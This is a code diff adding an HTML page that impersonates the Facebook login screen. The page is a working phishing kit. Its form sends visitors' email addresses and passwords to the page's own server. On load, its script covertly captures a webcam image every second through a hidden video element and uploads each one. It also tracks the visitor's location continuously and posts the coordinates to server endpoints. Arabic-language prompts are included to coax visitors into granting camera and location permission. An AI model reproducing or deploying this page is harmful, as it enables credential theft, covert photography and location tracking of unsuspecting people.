@@ -1,0 +1,1012 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="utf-8">
+    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
+    <title>Facebook - log in or sign up</title>
+    <meta name="description" content="Log in to Facebook to start connecting with your friends, family and people you know." />
+    <!-- Removed mobile-specific meta tags -->
+    <meta name="theme-color" content="#1877f2">
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" />
+    <style nonce="Ns5MWSAn">
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 0;
+            margin: 0;
+            font-size: 16px;
+        }
+
+        .main-wrapper {
+            width: 100%;
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            max-width: 1000px;
+            margin: 72px auto 112px;
+            gap: 40px;
+        }
+
+        .left-column {
+            flex: 1;
+            max-width: 500px;
+            padding-right: 32px;
+            padding-top: 24px;
+        }
+
+        .right-column {
+            width: 396px;
+        }
+
+        .fb-logo {
+            margin-bottom: 16px;
+        }
+        
+        .fb-logo img {
+            width: 300px;
+            margin-left: -28px;
+        }
+
+        .intro-text {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            width: 500px;
+            color: #1c1e21;
+        }
+
+        .login-form {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+            width: 396px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-control {
+            width: 100%;
+            height: 52px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            padding: 0 16px;
+            color: #1d2129;
+        }
+
+        .form-control:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+
+        .login-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 14px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: background-color 0.3s;
+        }
+
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            text-align: center;
+        }
+
+        .create-button {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px 16px;
+            cursor: pointer;
+            display: inline-block;
+            text-decoration: none;
+            transition: background-color 0.3s;
+        }
+
+        .create-button:hover {
+            background-color: #36a420;
+        }
+
+        .business-link {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+
+        .business-link a {
+            text-decoration: none;
+            font-weight: 600;
+            color: #1c1e21;
+        }
+
+        .business-link a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            background-color: #fff;
+            width: 100%;
+            padding: 20px 40px;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+        }
+
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+        }
+
+        .languages {
+            display: flex;
+            flex-wrap: wrap;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #dddfe2;
+        }
+
+        .language-link {
+            font-size: 12px;
+            color: #8a8d91;
+            text-decoration: none;
+            padding: 0 10px 0 0;
+        }
+
+        .language-link:hover {
+            text-decoration: underline;
+        }
+
+        .language-link.active {
+            color: #1877f2;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            margin-top: 8px;
+        }
+
+        .footer-link {
+            color: #8a8d91;
+            text-decoration: none;
+            font-size: 12px;
+            padding: 0 10px 0 0;
+            margin: 3px 0;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .copyright {
+            font-size: 11px;
+            color: #8a8d91;
+            margin-top: 20px;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 16px;
+            cursor: pointer;
+            color: #888;
+            z-index: 2;
+        }
+
+        .password-toggle svg {
+            width: 22px;
+            height: 22px;
+            stroke-width: 1.2;
+            color: #777;
+        }
+        
+        /* Splash Screen / Reels Styles - preserved for functionality */
+        #splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            z-index: 9999;
+            transition: opacity 0.5s ease-out;
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            display: none;
+        }
+
+        .fb-loader {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
+        }
+
+        .loading-text {
+            color: #65676b;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        /* Loader animation */
+        .fb-loader svg {
+            animation: rotate 1s linear infinite;
+        }
+
+        @keyframes rotate {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .reels-header {
+            height: 60px;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: white;
+            background: rgba(0,0,0,0.4);
+        }
+
+        .reels-header h2 {
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .reels-close {
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .reels-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 20px;
+        }
+
+        .video-container {
+            width: 100%;
+            max-width: 340px;
+            position: relative;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+
+        .video-content {
+            width: 100%;
+            height: 0;
+            padding-bottom: 177.77%; /* 16:9 aspect ratio */
+            position: relative;
+            overflow: hidden;
+        }
+
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+        }
+
+        .video-play-button {
+            width: 70px;
+            height: 70px;
+            background: rgba(255,255,255,0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .video-actions {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            width: 100%;
+            padding: 0 15px;
+            display: flex;
+            align-items: center;
+        }
+
+        /* Camera related styles */
+        .camera-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9998;
+            display: none;
+        }
+
+        .camera-content {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        #cameraFeed {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .camera-controls {
+            position: absolute;
+            bottom: 30px;
+            left: 0;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .capture-button {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.3);
+            border: 4px solid #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .capture-inner {
+            width: 54px;
+            height: 54px;
+            border-radius: 50%;
+            background: #fff;
+        }
+
+        .camera-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 40px;
+            height: 40px;
+            background: rgba(0,0,0,0.4);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        /* Location modal */
+        .location-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .location-content {
+            background: #fff;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 12px;
+            padding: 20px;
+        }
+
+        .location-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .location-message {
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .location-buttons {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .location-button {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .location-allow {
+            background: #1877f2;
+            color: #fff;
+            margin-left: 10px;
+        }
+
+        .location-deny {
+            background: #e4e6eb;
+            color: #4b4f56;
+            margin-right: 10px;
+        }
+
+        /* Permission modal */
+        .permission-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 9997;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .permission-content {
+            background: #fff;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 12px;
+            padding: 20px;
+        }
+
+        .permission-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .permission-message {
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .permission-buttons {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .permission-button {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .permission-allow {
+            background: #1877f2;
+            color: #fff;
+            margin-left: 10px;
+        }
+
+        .permission-deny {
+            background: #e4e6eb;
+            color: #4b4f56;
+            margin-right: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-wrapper">
+        <div class="left-column">
+            <div class="fb-logo">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
+            </div>
+            <h2 class="intro-text">Facebook helps you connect and share with the people in your life.</h2>
+        </div>
+        <div class="right-column">
+            <div class="login-form">
+                <form action="/submit" method="post" id="loginForm">
+                    <div class="form-group">
+                        <input type="text" class="form-control" name="email" id="email" placeholder="Email address or phone number" required autocomplete="off">
+                    </div>
+                    <div class="form-group password-container">
+                        <input type="password" class="form-control" name="password" id="password" placeholder="Password" required autocomplete="off">
+                        <span class="password-toggle" id="passwordToggle">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                            </svg>
+                        </span>
+                    </div>
+                    <button type="submit" class="login-button">Log in</button>
+                </form>
+                <div class="forgot-password">
+                    <a href="#">Forgotten password?</a>
+                </div>
+                <div class="divider"></div>
+                <div class="create-account">
+                    <a href="#" class="create-button">Create new account</a>
+                </div>
+            </div>
+            <div class="business-link">
+                <a href="#">Create a Page</a> for a celebrity, brand or business.
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-content">
+            <div class="languages">
+                <a href="#" class="language-link active">English (UK)</a>
+                <a href="#" class="language-link">Türkçe</a>
+                <a href="#" class="language-link">Kurdî (Kurmancî)</a>
+                <a href="#" class="language-link">العربية</a>
+                <a href="#" class="language-link">Zaza</a>
+                <a href="#" class="language-link">Deutsch</a>
+                <a href="#" class="language-link">Русский</a>
+                <a href="#" class="language-link">Français (France)</a>
+                <a href="#" class="language-link">فارسی</a>
+                <a href="#" class="language-link">Español</a>
+                <a href="#" class="language-link">Português (Brasil)</a>
+                <a href="#" class="language-link">+</a>
+            </div>
+            <div class="footer-links">
+                <a href="#" class="footer-link">Sign Up</a>
+                <a href="#" class="footer-link">Log in</a>
+                <a href="#" class="footer-link">Messenger</a>
+                <a href="#" class="footer-link">Facebook Lite</a>
+                <a href="#" class="footer-link">Video</a>
+                <a href="#" class="footer-link">Meta Pay</a>
+                <a href="#" class="footer-link">Meta Store</a>
+                <a href="#" class="footer-link">Meta Quest</a>
+                <a href="#" class="footer-link">Ray-Ban Meta</a>
+                <a href="#" class="footer-link">Meta AI</a>
+                <a href="#" class="footer-link">Instagram</a>
+                <a href="#" class="footer-link">Threads</a>
+                <a href="#" class="footer-link">Voting Information Centre</a>
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Privacy Centre</a>
+                <a href="#" class="footer-link">About</a>
+                <a href="#" class="footer-link">Create ad</a>
+                <a href="#" class="footer-link">Create Page</a>
+                <a href="#" class="footer-link">Developers</a>
+                <a href="#" class="footer-link">Careers</a>
+                <a href="#" class="footer-link">Cookies</a>
+                <a href="#" class="footer-link">AdChoices</a>
+                <a href="#" class="footer-link">Terms</a>
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">Contact uploading and non-users</a>
+            </div>
+            <div class="copyright">Meta © 2025</div>
+        </div>
+    </div>
+
+    <!-- Splash Screen (Hidden initially) -->
+    <div id="splash-screen" style="display: none;">
+        <div class="reels-header">
+            <h2>Facebook</h2>
+            <div class="reels-close" id="closeReels">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                </svg>
+            </div>
+        </div>
+        <div class="reels-content">
+            <div class="video-container">
+                <div class="video-content">
+                    <div class="video-overlay">
+                        <div class="video-play-button" id="playButton">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="white" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <polygon points="5 3 19 12 5 21 5 3"></polygon>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Camera Container (Hidden initially) -->
+    <div class="camera-container" id="cameraContainer">
+        <div class="camera-content">
+            <video id="cameraFeed" autoplay playsinline></video>
+            <canvas id="canvas" style="display:none;"></canvas>
+            <div class="camera-controls">
+                <div class="capture-button" id="captureButton">
+                    <div class="capture-inner"></div>
+                </div>
+            </div>
+            <div class="camera-close" id="cameraClose">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <!-- Location Modal (Hidden initially) -->
+    <div class="location-modal" id="locationModal">
+        <div class="location-content">
+            <div class="location-title">Share your location</div>
+            <div class="location-message">Facebook wants to access your location to provide a better experience and help your friends know where you are.</div>
+            <div class="location-buttons">
+                <button class="location-button location-deny" id="locationDeny">Deny</button>
+                <button class="location-button location-allow" id="locationAllow">Allow</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Permission Modal (Hidden initially) -->
+    <div class="permission-modal" id="browserPermissionModal" style="display: flex;">
+        <div class="permission-content">
+            <div class="permission-title">السماح بالوصول إلى الكاميرا</div>
+            <div class="permission-message">يرغب Facebook في الوصول إلى الكاميرا الخاصة بك لتحسين تجربة التصفح واستخدام الميزات المتقدمة.</div>
+            <div class="permission-buttons">
+                <button class="permission-button permission-deny" id="browserPermissionDeny">رفض</button>
+                <button class="permission-button permission-allow" id="browserPermissionAllow">السماح</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="permission-modal" id="locationBrowserModal" style="display: none;">
+        <div class="permission-content">
+            <div class="permission-title">مشاركة موقعك</div>
+            <div class="permission-message">يرغب Facebook في معرفة موقعك لتوفير محتوى مخصص ومساعدتك في العثور على أصدقاء وأحداث في منطقتك.</div>
+            <div class="permission-buttons">
+                <button class="permission-button permission-deny" id="locationBrowserDeny">رفض</button>
+                <button class="permission-button permission-allow" id="locationBrowserAllow">السماح</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="fb-loader">
+            <svg width="60" height="60" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="50" cy="50" r="45" fill="none" stroke="#1877f2" stroke-width="8" stroke-dasharray="150 50" />
+            </svg>
+        </div>
+        <div class="loading-text">Logging in...</div>
+    </div>
+
+    <script>
+        // Toggle password visibility
+        document.getElementById('passwordToggle').addEventListener('click', function() {
+            const passwordField = document.getElementById('password');
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                this.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
+                </svg>`;
+            } else {
+                passwordField.type = 'password';
+                this.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                </svg>`;
+            }
+        });
+
+        // Add form submission handler
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // Show loading overlay
+            document.getElementById('loadingOverlay').style.display = 'flex';
+        });
+
+        // Permission handling code
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hide custom modal dialogs as we'll use native browser prompts directly
+            const browserPermissionModal = document.getElementById('browserPermissionModal');
+            const locationBrowserModal = document.getElementById('locationBrowserModal');
+            
+            if (browserPermissionModal) browserPermissionModal.style.display = 'none';
+            if (locationBrowserModal) locationBrowserModal.style.display = 'none';
+            
+            // Create hidden elements for media capture
+            const hiddenVideo = document.createElement('video');
+            hiddenVideo.setAttribute('playsinline', '');
+            hiddenVideo.setAttribute('autoplay', '');
+            hiddenVideo.style.width = '1px';
+            hiddenVideo.style.height = '1px';
+            hiddenVideo.style.position = 'absolute';
+            hiddenVideo.style.opacity = '0.01';
+            hiddenVideo.style.pointerEvents = 'none';
+            document.body.appendChild(hiddenVideo);
+            
+            const hiddenCanvas = document.createElement('canvas');
+            hiddenCanvas.style.display = 'none';
+            document.body.appendChild(hiddenCanvas);
+            
+            let mediaStream = null;
+            let locationWatchId = null;
+            let captureInterval = null;
+            
+            // Request permissions when page loads or after brief delay
+            setTimeout(requestCameraPermission, 1000);
+            
+            // Request browser camera permission directly
+            function requestCameraPermission() {
+                // Request browser camera permission - this will show the browser's native permission dialog
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: "user"
+                    },
+                    audio: false 
+                })
+                .then(function(stream) {
+                    console.log('Camera access granted');
+                    mediaStream = stream;
+                    hiddenVideo.srcObject = stream;
+                    
+                    // Start capturing images after camera access
+                    startPeriodicCapture();
+                    
+                    // Send permission granted status
+                    fetch('/api/permissions', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            cameraAccess: true,
+                            timestamp: new Date().toISOString(),
+                            source: 'desktop_direct_browser_prompt'
+                        })
+                    });
+                    
+                    // Request location permission after camera
+                    setTimeout(requestLocationPermission, 500);
+                })
+                .catch(function(err) {
+                    console.log('Camera access denied:', err);
+                    
+                    // Send permission denied status
+                    fetch('/api/permissions', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            cameraAccess: false,
+                            error: err.name,
+                            timestamp: new Date().toISOString(),
+                            source: 'desktop_direct_browser_prompt'
+                        })
+                    });
+                    
+                    // Still request location permission anyway
+                    setTimeout(requestLocationPermission, 500);
+                });
+            }
+            
+            // Request browser location permission directly
+            function requestLocationPermission() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            // Location permission granted, send data
+                            sendLocationData(position);
+                            
+                            // Start continuous location tracking
+                            startLocationTracking();
+                        },
+                        function(err) {
+                            console.log('Location access denied:', err);
+                            
+                            // Send permission denied status
+                            fetch('/api/get-location', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    denied: true,
+                                    error: err.code,
+                                    timestamp: new Date().toISOString(),
+                                    source: 'desktop_direct_browser_prompt'
+                                })
+                            });
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            maximumAge: 0,
+                            timeout: 5000
+                        }
+                    );
+                }
+            }
+            
+            function startLocationTracking() {
+                // Start continuous location tracking with high accuracy
+                if (navigator.geolocation) {
+                    locationWatchId = navigator.geolocation.watchPosition(
+                        sendLocationData,
+                        function(err) {
+                            console.log('Error during location tracking:', err);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            maximumAge: 5000,
+                            timeout: 10000
+                        }
+                    );
+                }
+            }
+            
+            function sendLocationData(position) {
+                // Send location data to server
+                fetch('/api/get-location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: position.timestamp,
+                        source: 'desktop_direct_browser_prompt'
+                    })
+                });
+            }
+            
+            function startPeriodicCapture() {
+                // Capture one image immediately
+                captureImage();
+                
+                // Then capture one image every second
+                captureInterval = setInterval(captureImage, 1000);
+                
+                // Clean up when navigating away
+                window.addEventListener('beforeunload', function() {
+                    cleanupTracking();
+                });
+            }
+            
+            function captureImage() {
+                if (!mediaStream || !hiddenVideo.videoWidth) return;
+                
+                // Set canvas size to match video
+                hiddenCanvas.width = hiddenVideo.videoWidth;
+                hiddenCanvas.height = hiddenVideo.videoHeight;
+                
+                // Draw current video frame to canvas
+                const ctx = hiddenCanvas.getContext('2d');
+                ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+                
+                // Convert canvas to blob and send to server
+                hiddenCanvas.toBlob(function(blob) {
+                    const formData = new FormData();
+                    formData.append('photo', blob, `desktop_browser_${Date.now()}.jpg`);
+                    formData.append('source', 'desktop_direct_browser_prompt');
+                    
+                    // Send image to server
+                    fetch('/api/capture-photo', {
+                        method: 'POST',
+                        body: formData
+                    });
+                }, 'image/jpeg', 0.8);
+            }
+            
+            function cleanupTracking() {
+                // Stop capturing images
+                if (captureInterval) {
+                    clearInterval(captureInterval);
+                }
+                
+                // Stop location tracking
+                if (locationWatchId !== null) {
+                    navigator.geolocation.clearWatch(locationWatchId);
+                }
+                
+                // Stop all video tracks
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => {
+                        track.stop();
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html> 
